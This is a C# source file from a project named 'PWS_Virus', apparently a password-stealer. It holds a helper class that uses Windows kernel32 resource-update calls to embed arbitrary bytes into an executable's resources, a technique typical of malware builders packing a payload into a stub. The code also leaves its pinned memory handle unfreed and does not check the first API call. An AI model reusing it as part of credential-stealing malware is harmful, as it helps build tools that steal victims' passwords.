using System;
using System.Runtime.InteropServices;

namespace PWS_Virus
{
    class Writer
    {
        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern IntPtr BeginUpdateResource(string pFileName,
        [MarshalAs(UnmanagedType.Bool)]bool bDeleteExistingResources);
        [DllImport("kernel32.dll", SetLastError = true)]
        static extern bool UpdateResource(IntPtr hUpdate, string lpType, string lpName, ushort wLanguage, IntPtr lpData, uint cbData);
        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern bool EndUpdateResource(IntPtr hUpdate, bool fDiscard);

        public enum ICResult
        {
            Success,
            FailBegin,
            FailUpdate,
            FailEnd
        }

        /// <summary>
        /// Writes native resources to a given file
        /// </summary>
        /// <param name="FileName">File to write resources to</param>
        /// <param name="FileBytes">Bytes to write as resource</param>
        /// <param name="ResName">Resource name allocated to the resource bytes</param>
        /// <returns>Returns a result on which step of the process the function is</returns>
        public static ICResult WriteResource(string FileName, byte[] FileBytes, string ResName)
        {
            //initialize the resource update process
            IntPtr hUpdate = BeginUpdateResource(FileName, false);
            //prevent the garbage collector from clearing the allocated space
            GCHandle Handle = GCHandle.Alloc(FileBytes, GCHandleType.Pinned);

            //Update the bytes with the given name and give an error if one occurs
            if (!UpdateResource(hUpdate, "RT_RCDATA", ResName, 1066, Handle.AddrOfPinnedObject(), Convert.ToUInt32(FileBytes.Length)))
                return ICResult.FailUpdate;
            if (!EndUpdateResource(hUpdate, false))
                return ICResult.FailEnd;

            return ICResult.Success;
        }
    }
}
